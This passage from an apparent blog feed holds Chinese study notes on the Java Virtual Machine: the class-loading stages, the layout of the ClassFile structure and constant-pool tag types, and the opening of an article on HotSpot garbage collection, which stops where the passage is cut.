文件的字节流中包含的信息符合《Java 虚拟机规范》的全部约束要求，保证这些信息被当作代码运行后不会危害虚拟机自身的安全。</strong></p><p>验证阶段这一步在整个类加载过程中耗费的资源还是相对较多的，但很有必要，可以有效防止恶意代码的执行。任何时候，程序安全都是第一位。</p><p>不过，验证阶段也不是必须要执行的阶段。如果程序运行的全部代码(包括自己编写的、第三方包中的、从外部加载的、动态生成的等所有代码)都已经被反复使用和验证过，在生产环境的实施阶段就可以考虑使用 <code>-Xverify:none</code> 参数来关闭大部分的类验证措施，以缩短虚拟机类加载的时间。</p><p>验证阶段主要由四个检验阶段组成：</p><ol><li>文件格式验证（Class 文件格式检查）</li><li>元数据验证（字节码语义检查）</li><li>字节码验证（程序语义检查）</li><li>符号引用验证（类的正确性检查）</li></ol><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/407384776/class-loading-process-verification.png" alt="验证阶段示意图"></p><p>文件格式验证这一阶段是基于该类的二进制字节流进行的，主要目的是保证输入的字节流能正确地解析并存储于方法区之内，格式上符合描述一个 Java 类型信息的要求。除了这一阶段之外，其余三个验证阶段都是基于方法区的存储结构上进行的，不会再直接读取、操作字节流了。</p><blockquote><p>方法区属于是 JVM 运行时数据区域的一块逻辑区域，是各个线程共享的内存区域。当虚拟机要使用一个类时，它需要读取并解析 Class 文件获取相关信息，再将信息存入到方法区。方法区会存储已被虚拟机加载的 <strong>类信息、字段信息、方法信息、常量、静态变量、即时编译器编译后的代码缓存等数据</strong>。</p><p>关于方法区的详细介绍，推荐阅读 <a href="https://javaguide.cn/java/jvm/memory-area.html" title="Java 内存区域详解">Java 内存区域详解</a> 这篇文章。</p></blockquote><p>符号引用验证发生在类加载过程中的解析阶段，具体点说是 JVM 将符号引用转化为直接引用的时候（解析阶段会介绍符号引用和直接引用）。</p><p>符号引用验证的主要目的是确保解析阶段能正常执行，如果无法通过符号引用验证，JVM 会抛出异常，比如：</p><ul><li><code>java.lang.IllegalAccessError</code>：当类试图访问或修改它没有权限访问的字段，或调用它没有权限访问的方法时，抛出该异常。</li><li><code>java.lang.NoSuchFieldError</code>：当类试图访问或修改一个指定的对象字段，而该对象不再包含该字段时，抛出该异常。</li><li><code>java.lang.NoSuchMethodError</code>：当类试图访问一个指定的方法，而该方法不存在时，抛出该异常。</li><li>……</li></ul><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p><strong>准备阶段是正式为类变量分配内存并设置类变量初始值的阶段</strong>，这些内存都将在方法区中分配。对于该阶段有以下几点需要注意：</p><ol><li>这时候进行内存分配的仅包括类变量（ Class Variables ，即静态变量，被 <code>static</code> 关键字修饰的变量，只与类相关，因此被称为类变量），而不包括实例变量。实例变量会在对象实例化时随着对象一块分配在 Java 堆中。</li><li>从概念上讲，类变量所使用的内存都应当在 <strong>方法区</strong> 中进行分配。不过有一点需要注意的是：JDK 7 之前，HotSpot 使用永久代来实现方法区的时候，实现是完全符合这种逻辑概念的。 而在 JDK 7 及之后，HotSpot 已经把原本放在永久代的字符串常量池、静态变量等移动到堆中，这个时候类变量则会随着 Class 对象一起存放在 Java 堆中。相关阅读：<a href="https://github.com/fenixsoft/jvm_book/issues/75" title="《深入理解Java虚拟机（第3版）》勘误#75">《深入理解 Java 虚拟机（第 3 版）》勘误#75</a></li><li>这里所设置的初始值”通常情况”下是数据类型默认的零值（如 0、0L、null、false 等），比如我们定义了<code>public static int value=111</code> ，那么 value 变量在准备阶段的初始值就是 0 而不是 111（初始化阶段才会赋值）。特殊情况：比如给 value 变量加上了 final 关键字<code>public static final int value=111</code> ，那么准备阶段 value 的值就被赋值为 111。</li></ol><p><strong>基本数据类型的零值</strong>：(图片来自《深入理解 Java 虚拟机》第 3 版 7.33 )</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/407384776/%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E9%9B%B6%E5%80%BC.png" alt="基本数据类型的零值"></p><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p><strong>解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程。</strong> 解析动作主要针对类或接口、字段、类方法、接口方法、方法类型、方法句柄和调用限定符 7 类符号引用进行。</p><p>《深入理解 Java 虚拟机》7.34 节第三版对符号引用和直接引用的解释如下：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/407384776/symbol-reference-and-direct-reference-20230614221246704.png" alt="符号引用和直接引用"></p><p>举个例子：在程序执行方法时，系统需要明确知道这个方法所在的位置。Java 虚拟机为每个类都准备了一张方法表来存放类中所有的方法。当需要调用一个类的方法的时候，只要知道这个方法在方法表中的偏移量就可以直接调用该方法了。通过解析操作符号引用就可以直接转变为目标方法在类中方法表的位置，从而使得方法可以被调用。</p><p>综上，解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程，也就是得到类或者字段、方法在内存中的指针或者偏移量。</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p><strong>初始化阶段是执行初始化方法 <code>&lt;clinit&gt; ()</code>方法的过程，是类加载的最后一步，这一步 JVM 才开始真正执行类中定义的 Java 程序代码(字节码)。</strong></p><blockquote><p>说明：<code>&lt;clinit&gt; ()</code>方法是编译之后自动生成的。</p></blockquote><p>对于<code>&lt;clinit&gt; ()</code> 方法的调用，虚拟机会自己确保其在多线程环境中的安全性。因为 <code>&lt;clinit&gt; ()</code> 方法是带锁线程安全，所以在多线程环境下进行类初始化的话可能会引起多个线程阻塞，并且这种阻塞很难被发现。</p><p>对于初始化阶段，虚拟机严格规范了有且只有 5 种情况下，必须对类进行初始化(只有主动去使用类才会初始化类)：</p><ol><li>当遇到 <code>new</code>、 <code>getstatic</code>、<code>putstatic</code> 或 <code>invokestatic</code> 这 4 条字节码指令时，比如 <code>new</code> 一个类，读取一个静态字段(未被 final 修饰)、或调用一个类的静态方法时。<ul><li>当 jvm 执行 <code>new</code> 指令时会初始化类。即当程序创建一个类的实例对象。</li><li>当 jvm 执行 <code>getstatic</code> 指令时会初始化类。即程序访问类的静态变量(不是静态常量，常量会被加载到运行时常量池)。</li><li>当 jvm 执行 <code>putstatic</code> 指令时会初始化类。即程序给类的静态变量赋值。</li><li>当 jvm 执行 <code>invokestatic</code> 指令时会初始化类。即程序调用类的静态方法。</li></ul></li><li>使用 <code>java.lang.reflect</code> 包的方法对类进行反射调用时如 <code>Class.forname("...")</code>, <code>newInstance()</code> 等等。如果类没初始化，需要触发其初始化。</li><li>初始化一个类，如果其父类还未初始化，则先触发该父类的初始化。</li><li>当虚拟机启动时，用户需要定义一个要执行的主类 (包含 <code>main</code> 方法的那个类)，虚拟机会先初始化这个类。</li><li><code>MethodHandle</code> 和 <code>VarHandle</code> 可以看作是轻量级的反射调用机制，而要想使用这 2 个调用，<br>就必须先使用 <code>findStaticVarHandle</code> 来初始化要调用的类。</li><li><strong>「补充，来自<a href="https://github.com/Snailclimb/JavaGuide/issues/745" title="issue745">issue745</a>」</strong> 当一个接口中定义了 JDK8 新加入的默认方法（被 default 关键字修饰的接口方法）时，如果有这个接口的实现类发生了初始化，那该接口要在其之前被初始化。</li></ol><h2 id="类卸载"><a href="#类卸载" class="headerlink" title="类卸载"></a>类卸载</h2><blockquote><p>卸载这部分内容来自 <a href="https://github.com/Snailclimb/JavaGuide/issues/662" title="issue#662">issue#662</a>由 <strong><a href="https://github.com/guang19" title="guang19">guang19</a></strong> 补充完善。</p></blockquote><p><strong>卸载类即该类的 Class 对象被 GC。</strong></p><p>卸载类需要满足 3 个要求:</p><ol><li>该类的所有的实例对象都已被 GC，也就是说堆不存在该类的实例对象。</li><li>该类没有在其他任何地方被引用</li><li>该类的类加载器的实例已被 GC</li></ol><p>所以，在 JVM 生命周期内，由 jvm 自带的类加载器加载的类是不会被卸载的。但是由我们自定义的类加载器加载的类是可能被卸载的。</p><p>只要想通一点就好了，JDK 自带的 <code>BootstrapClassLoader</code>, <code>ExtClassLoader</code>, <code>AppClassLoader</code> 负责加载 JDK 提供的类，所以它们(类加载器的实例)肯定不会被回收。而我们自定义的类加载器的实例是可以被回收的，所以使用我们自定义加载器加载的类是可以被卸载掉的。</p><p><strong>参考</strong></p><ul><li>javaguide: <a href="https://javaguide.cn/java/jvm/">https://javaguide.cn/java/jvm/</a></li><li>《深入理解 Java 虚拟机》</li><li>《实战 Java 虚拟机》</li><li>Chapter 5. Loading, Linking, and Initializing - Java Virtual Machine Specification：<a href="https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-5.html#jvms-5.4">https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-5.html#jvms-5.4</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类文件结构详解</title>
      <link href="/posts/2384868174/"/>
      <url>/posts/2384868174/</url>
      
        <content type="html"><![CDATA[<h2 id="回顾一下字节码"><a href="#回顾一下字节码" class="headerlink" title="回顾一下字节码"></a>回顾一下字节码</h2><p>在 Java 中，JVM 可以理解的代码就叫做<code>字节码</code>（即扩展名为 <code>.class</code> 的文件），它不面向任何特定的处理器，只面向虚拟机。Java 语言通过字节码的方式，在一定程度上解决了传统解释型语言执行效率低的问题，同时又保留了解释型语言可移植的特点。所以 Java 程序运行时比较高效，而且，由于字节码并不针对一种特定的机器，因此，Java 程序无须重新编译便可在多种不同操作系统的计算机上运行。</p><p>Clojure（Lisp 语言的一种方言）、Groovy、Scala、JRuby、Kotlin 等语言都是运行在 Java 虚拟机之上。下图展示了不同的语言被不同的编译器编译成<code>.class</code>文件最终运行在 Java 虚拟机之上。<code>.class</code>文件的二进制格式可以使用 <a href="https://www.x-ways.net/winhex/">WinHex</a> 查看。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2384868174/java-virtual-machine-program-language-os.png" alt="运行在 Java 虚拟机之上的编程语言"></p><p>可以说<code>.class</code>文件是不同的语言在 Java 虚拟机之间的重要桥梁，同时也是支持 Java 跨平台很重要的一个原因。</p><h2 id="Class-文件结构总结"><a href="#Class-文件结构总结" class="headerlink" title="Class 文件结构总结"></a>Class 文件结构总结</h2><p>根据 Java 虚拟机规范，Class 文件通过 <code>ClassFile</code> 定义，有点类似 C 语言的结构体。</p><p><code>ClassFile</code> 的结构如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ClassFile {</span><br><span class="line">    u4             magic; <span class="comment">//Class 文件的标志</span></span><br><span class="line">    u2             minor_version;<span class="comment">//Class 的小版本号</span></span><br><span class="line">    u2             major_version;<span class="comment">//Class 的大版本号</span></span><br><span class="line">    u2             constant_pool_count;<span class="comment">//常量池的数量</span></span><br><span class="line">    cp_info        constant_pool[constant_pool_count-<span class="number">1</span>];<span class="comment">//常量池</span></span><br><span class="line">    u2             access_flags;<span class="comment">//Class 的访问标记</span></span><br><span class="line">    u2             this_class;<span class="comment">//当前类</span></span><br><span class="line">    u2             super_class;<span class="comment">//父类</span></span><br><span class="line">    u2             interfaces_count;<span class="comment">//接口</span></span><br><span class="line">    u2             interfaces[interfaces_count];<span class="comment">//一个类可以实现多个接口</span></span><br><span class="line">    u2             fields_count;<span class="comment">//Class 文件的字段属性</span></span><br><span class="line">    field_info     fields[fields_count];<span class="comment">//一个类可以有多个字段</span></span><br><span class="line">    u2             methods_count;<span class="comment">//Class 文件的方法数量</span></span><br><span class="line">    method_info    methods[methods_count];<span class="comment">//一个类可以有个多个方法</span></span><br><span class="line">    u2             attributes_count;<span class="comment">//此类的属性表中的属性数</span></span><br><span class="line">    attribute_info attributes[attributes_count];<span class="comment">//属性表集合</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>通过分析 <code>ClassFile</code> 的内容，我们便可以知道 class 文件的组成。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2384868174/16d5ec47609818fc.jpeg" alt="ClassFile 内容分析"></p><p>下面这张图是通过 IDEA 插件 <code>jclasslib</code> 查看的，你可以更直观看到 Class 文件结构。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2384868174/image-20210401170711475.png"></p><p>使用 <code>jclasslib</code> 不光可以直观地查看某个类对应的字节码文件，还可以查看类的基本信息、常量池、接口、属性、函数等信息。</p><p>下面详细介绍一下 Class 文件结构涉及到的一些组件。</p><h3 id="魔数（Magic-Number）"><a href="#魔数（Magic-Number）" class="headerlink" title="魔数（Magic Number）"></a>魔数（Magic Number）</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u4             magic; <span class="comment">//Class 文件的标志</span></span><br></pre></td></tr></tbody></table></figure><p>每个 Class 文件的头 4 个字节称为魔数（Magic Number）,它的唯一作用是<strong>确定这个文件是否为一个能被虚拟机接收的 Class 文件</strong>。</p><p>程序设计者很多时候都喜欢用一些特殊的数字表示固定的文件类型或者其它特殊的含义。</p><h3 id="Class-文件版本号（Minor-amp-Major-Version）"><a href="#Class-文件版本号（Minor-amp-Major-Version）" class="headerlink" title="Class 文件版本号（Minor&amp;Major Version）"></a>Class 文件版本号（Minor&amp;Major Version）</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u2             minor_version;<span class="comment">//Class 的小版本号</span></span><br><span class="line">u2             major_version;<span class="comment">//Class 的大版本号</span></span><br></pre></td></tr></tbody></table></figure><p>紧接着魔数的四个字节存储的是 Class 文件的版本号：第 5 和第 6 位是<strong>次版本号</strong>，第 7 和第 8 位是<strong>主版本号</strong>。</p><p>每当 Java 发布大版本（比如 Java 8，Java9）的时候，主版本号都会加 1。你可以使用 <code>javap -v</code> 命令来快速查看 Class 文件的版本号信息。</p><p>高版本的 Java 虚拟机可以执行低版本编译器生成的 Class 文件，但是低版本的 Java 虚拟机不能执行高版本编译器生成的 Class 文件。所以，我们在实际开发的时候要确保开发的的 JDK 版本和生产环境的 JDK 版本保持一致。</p><h3 id="常量池（Constant-Pool）"><a href="#常量池（Constant-Pool）" class="headerlink" title="常量池（Constant Pool）"></a>常量池（Constant Pool）</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u2             constant_pool_count;<span class="comment">//常量池的数量</span></span><br><span class="line">cp_info        constant_pool[constant_pool_count-<span class="number">1</span>];<span class="comment">//常量池</span></span><br></pre></td></tr></tbody></table></figure><p>紧接着主次版本号之后的是常量池，常量池的数量是 <code>constant_pool_count-1</code>（<strong>常量池计数器是从 1 开始计数的，将第 0 项常量空出来是有特殊考虑的，索引值为 0 代表“不引用任何一个常量池项”</strong>）。</p><p>常量池主要存放两大常量：字面量和符号引用。字面量比较接近于 Java 语言层面的的常量概念，如文本字符串、声明为 final 的常量值等。而符号引用则属于编译原理方面的概念。包括下面三类常量：</p><ul><li>类和接口的全限定名</li><li>字段的名称和描述符</li><li>方法的名称和描述符</li></ul><p>常量池中每一项常量都是一个表，这 14 种表有一个共同的特点：<strong>开始的第一位是一个 u1 类型的标志位 -tag 来标识常量的类型，代表当前这个常量属于哪种常量类型．</strong></p><table><thead><tr><th align="center">类型</th><th align="center">标志（tag）</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">CONSTANT_utf8_info</td><td align="center">1</td><td align="center">UTF-8 编码的字符串</td></tr><tr><td align="center">CONSTANT_Integer_info</td><td align="center">3</td><td align="center">整形字面量</td></tr><tr><td align="center">CONSTANT_Float_info</td><td align="center">4</td><td align="center">浮点型字面量</td></tr><tr><td align="center">CONSTANT_Long_info</td><td align="center">５</td><td align="center">长整型字面量</td></tr><tr><td align="center">CONSTANT_Double_info</td><td align="center">６</td><td align="center">双精度浮点型字面量</td></tr><tr><td align="center">CONSTANT_Class_info</td><td align="center">７</td><td align="center">类或接口的符号引用</td></tr><tr><td align="center">CONSTANT_String_info</td><td align="center">８</td><td align="center">字符串类型字面量</td></tr><tr><td align="center">CONSTANT_FieldRef_info</td><td align="center">９</td><td align="center">字段的符号引用</td></tr><tr><td align="center">CONSTANT_MethodRef_info</td><td align="center">10</td><td align="center">类中方法的符号引用</td></tr><tr><td align="center">CONSTANT_InterfaceMethodRef_info</td><td align="center">11</td><td align="center">接口中方法的符号引用</td></tr><tr><td align="center">CONSTANT_NameAndType_info</td><td align="center">12</td><td align="center">字段或方法的符号引用</td></tr><tr><td align="center">CONSTANT_MethodType_info</td><td align="center">16</td><td align="center">标志方法类型</td></tr><tr><td align="center">CONSTANT_MethodHandle_info</td><td align="center">15</td><td align="center">表示方法句柄</td></tr><tr><td align="center">CONSTANT_InvokeDynamic_info</td><td align="center">18</td><td align="center">表示一个动态方法调用点</td></tr></tbody></table><p><code>.class</code> 文件可以通过<code>javap -v class类名</code> 指令来看一下其常量池中的信息(<code>javap -v class类名-&gt; temp.txt</code>：将结果输出到 temp.txt 文件)。</p><h3 id="访问标志-Access-Flags"><a href="#访问标志-Access-Flags" class="headerlink" title="访问标志(Access Flags)"></a>访问标志(Access Flags)</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u2             access_flags;<span class="comment">//Class 的访问标记</span></span><br></pre></td></tr></tbody></table></figure><p>在常量池结束之后，紧接着的两个字节代表访问标志，这个标志用于识别一些类或者接口层次的访问信息，包括：这个 Class 是类还是接口，是否为 <code>public</code> 或者 <code>abstract</code> 类型，如果是类的话是否声明为 <code>final</code> 等等。</p><p>类访问和属性修饰符:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2384868174/%E8%AE%BF%E9%97%AE%E6%A0%87%E5%BF%97.png" alt="类访问和属性修饰符"></p><p>我们定义了一个 <code>Employee</code> 类</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.snailclimb.bean;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> {</span><br><span class="line">   ...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>通过<code>javap -v class类名</code> 指令来看一下类的访问标志。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2384868174/%E6%9F%A5%E7%9C%8B%E7%B1%BB%E7%9A%84%E8%AE%BF%E9%97%AE%E6%A0%87%E5%BF%97.png" alt="查看类的访问标志"></p><h3 id="当前类（This-Class）、父类（Super-Class）、接口（Interfaces）索引集合"><a href="#当前类（This-Class）、父类（Super-Class）、接口（Interfaces）索引集合" class="headerlink" title="当前类（This Class）、父类（Super Class）、接口（Interfaces）索引集合"></a>当前类（This Class）、父类（Super Class）、接口（Interfaces）索引集合</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">u2             this_class;<span class="comment">//当前类</span></span><br><span class="line">u2             super_class;<span class="comment">//父类</span></span><br><span class="line">u2             interfaces_count;<span class="comment">//接口</span></span><br><span class="line">u2             interfaces[interfaces_count];<span class="comment">//一个类可以实现多个接口</span></span><br></pre></td></tr></tbody></table></figure><p>Java 类的继承关系由类索引、父类索引和接口索引集合三项确定。类索引、父类索引和接口索引集合按照顺序排在访问标志之后，</p><p>类索引用于确定这个类的全限定名，父类索引用于确定这个类的父类的全限定名，由于 Java 语言的单继承，所以父类索引只有一个，除了 <code>java.lang.Object</code> 之外，所有的 Java 类都有父类，因此除了 <code>java.lang.Object</code> 外，所有 Java 类的父类索引都不为 0。</p><p>接口索引集合用来描述这个类实现了那些接口，这些被实现的接口将按 <code>implements</code> (如果这个类本身是接口的话则是<code>extends</code>) 后的接口顺序从左到右排列在接口索引集合中。</p><h3 id="字段表集合（Fields）"><a href="#字段表集合（Fields）" class="headerlink" title="字段表集合（Fields）"></a>字段表集合（Fields）</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u2             fields_count;<span class="comment">//Class 文件的字段的个数</span></span><br><span class="line">field_info     fields[fields_count];<span class="comment">//一个类会可以有个字段</span></span><br></pre></td></tr></tbody></table></figure><p>字段表（field info）用于描述接口或类中声明的变量。字段包括类级变量以及实例变量，但不包括在方法内部声明的局部变量。</p><p><strong>field info(字段表) 的结构:</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2384868174/%E5%AD%97%E6%AE%B5%E8%A1%A8%E7%9A%84%E7%BB%93%E6%9E%84.png" alt="字段表的结构 "></p><ul><li><strong>access_flags:</strong> 字段的作用域（<code>public</code> ,<code>private</code>,<code>protected</code>修饰符），是实例变量还是类变量（<code>static</code>修饰符）,可否被序列化（transient 修饰符）,可变性（final）,可见性（volatile 修饰符，是否强制从主内存读写）。</li><li><strong>name_index:</strong> 对常量池的引用，表示的字段的名称；</li><li><strong>descriptor_index:</strong> 对常量池的引用，表示字段和方法的描述符；</li><li><strong>attributes_count:</strong> 一个字段还会拥有一些额外的属性，attributes_count 存放属性的个数；</li><li><strong>attributes[attributes_count]:</strong> 存放具体属性具体内容。</li></ul><p>上述这些信息中，各个修饰符都是布尔值，要么有某个修饰符，要么没有，很适合使用标志位来表示。而字段叫什么名字、字段被定义为什么数据类型这些都是无法固定的，只能引用常量池中常量来描述。</p><p><strong>字段的 access_flag 的取值:</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2384868174/image-20201031084342859.png" alt="字段的 access_flag 的取值"></p><h3 id="方法表集合（Methods）"><a href="#方法表集合（Methods）" class="headerlink" title="方法表集合（Methods）"></a>方法表集合（Methods）</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u2             methods_count;<span class="comment">//Class 文件的方法的数量</span></span><br><span class="line">method_info    methods[methods_count];<span class="comment">//一个类可以有个多个方法</span></span><br></pre></td></tr></tbody></table></figure><p>methods_count 表示方法的数量，而 method_info 表示方法表。</p><p>Class 文件存储格式中对方法的描述与对字段的描述几乎采用了完全一致的方式。方法表的结构如同字段表一样，依次包括了访问标志、名称索引、描述符索引、属性表集合几项。</p><p><strong>method_info(方法表的) 结构:</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2384868174/%E6%96%B9%E6%B3%95%E8%A1%A8%E7%9A%84%E7%BB%93%E6%9E%84.png" alt="方法表的结构"></p><p><strong>方法表的 access_flag 取值：</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2384868174/image-20201031084248965.png" alt="方法表的 access_flag 取值"></p><p>注意：因为<code>volatile</code>修饰符和<code>transient</code>修饰符不可以修饰方法，所以方法表的访问标志中没有这两个对应的标志，但是增加了<code>synchronized</code>、<code>native</code>、<code>abstract</code>等关键字修饰方法，所以也就多了这些关键字对应的标志。</p><h3 id="属性表集合（Attributes）"><a href="#属性表集合（Attributes）" class="headerlink" title="属性表集合（Attributes）"></a>属性表集合（Attributes）</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u2             attributes_count;<span class="comment">//此类的属性表中的属性数</span></span><br><span class="line">attribute_info attributes[attributes_count];<span class="comment">//属性表集合</span></span><br></pre></td></tr></tbody></table></figure><p>在 Class 文件，字段表，方法表中都可以携带自己的属性表集合，以用于描述某些场景专有的信息。与 Class 文件中其它的数据项目要求的顺序、长度和内容不同，属性表集合的限制稍微宽松一些，不再要求各个属性表具有严格的顺序，并且只要不与已有的属性名重复，任何人实现的编译器都可以向属性表中写 入自己定义的属性信息，Java 虚拟机运行时会忽略掉它不认识的属性。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>javaguide: <a href="https://javaguide.cn/java/jvm/">https://javaguide.cn/java/jvm/</a></li><li>《实战 Java 虚拟机》</li><li>Chapter 4. The class File Format - Java Virtual Machine Specification:<a href="https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-4.html">https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-4.html</a></li><li>实例分析 JAVA CLASS 的文件结构：<a href="https://coolshell.cn/articles/9229.html">https://coolshell.cn/articles/9229.html</a></li><li>《Java 虚拟机原理图解》 1.2.2、Class 文件中的常量池详解（上）：<a href="https://blog.csdn.net/luanlouis/article/details/39960815">https://blog.csdn.net/luanlouis/article/details/39960815</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM垃圾回收详解（重点）</title>
      <link href="/posts/152633231/"/>
      <url>/posts/152633231/</url>
      
        <content type="html"><![CDATA[<blockquote><p>如果没有特殊说明，都是针对的是 HotSpot 虚拟机。</p><p>本文基于《深入理解 Java 虚拟机：JVM 高级特性与最佳实践》进行总结补充。</p><p>常见面试题：</p><ul><li>如何判断对象是否死亡（两种方法）。</li><li>简单的介绍一下强引用、软引用、弱引用、虚引用（虚引用与软引用和弱引用的区别、使用软引用能带来的好处）。</li><li>如何判断一个常量是废弃常量</li><li>如何判断一个类是无用的类</li><li>垃圾收集有哪些算法，各自的特点？</li><li>HotSpot 为什么要分为新生代和老年代？</li><li>常见的垃圾回收器有哪些？</li><li>介绍一下 CMS,G1 收集器。</li><li>Minor Gc 和 Full GC 有什么不同呢？</li></ul></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当需要排查各种内存溢出问题、当垃圾收集成为系统达到更高并发的瓶颈时，我们就需要对这些“自动化”的技术实施必要的监控和调节。</p><h2 id="堆空间的基本结构"><a href="#堆空间的基本结构" class="headerlink" title="堆空间的基本结构"></a>堆空间的基本结构</h2><p>Java 的自动内存管理主要是针对对象内存的回收和对象内存的分配。同时，Java 自动内存管理最核心的功能是 <strong>堆</strong> 内存中对象的分配与回收。</p><p>Java 堆是垃圾收集器管理的主要区域，因此也被称作 <strong>GC 堆（Garbage Collected Heap）</strong>。</p><p>从垃圾回收的角度来说，由于现在收集器基本都采用分代垃圾收集算法，所以 Java 堆被划分为了几个不同的区域，这样我们就可以根据各个区域的特点选择合适的垃圾收集算法。</p><p>在 JDK 7 版本及 JDK 7 版本之前，堆内存被通常分为下面三部分：</p><ol><li>新生代内存(Young Generation)</li><li>老生代(Old Generation)</li><li>永久代(Permanent Generation)</li></ol><p>下图所示的 Eden 区、两个 Survivor 区 S0 和 S1 都属于新生代，中间一层属于老年代，最下面一层属于永久代。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/hotspot-heap-structure-20230614222444908.png" alt="堆内存结构"></p><p><strong>JDK 8 版本之后 PermGen(永久) 已被 Metaspace(元空间) 取代，元空间使用的是直接内存</strong> 。</p><p>关于堆空间结构更详细的介绍，可以回过头看看 <a href="./Java%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E8%AF%A6%E8%A7%A3.md">Java 内存区域详解</a> 这篇文章。</p><h2 id="内存分配和回收原则"><a href="#内存分配和回收原则" class="headerlink" title="内存分配和回收原则"></a>内存分配和回收原则</h2><h3 id="对象优先在-Eden-区分配"><a href="#对象优先在-Eden-区分配" class="headerlink" title="对象优先在 Eden 区分配"></a>对象优先在 Eden 区分配</h3><p>大多数情况下，对象在新生代中 Eden 区分配。当 Eden 区没有足够空间进行分配时，虚拟机将发起一次 Minor GC。下面我们来进行实际测试以下。</p><p>测试代码：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span 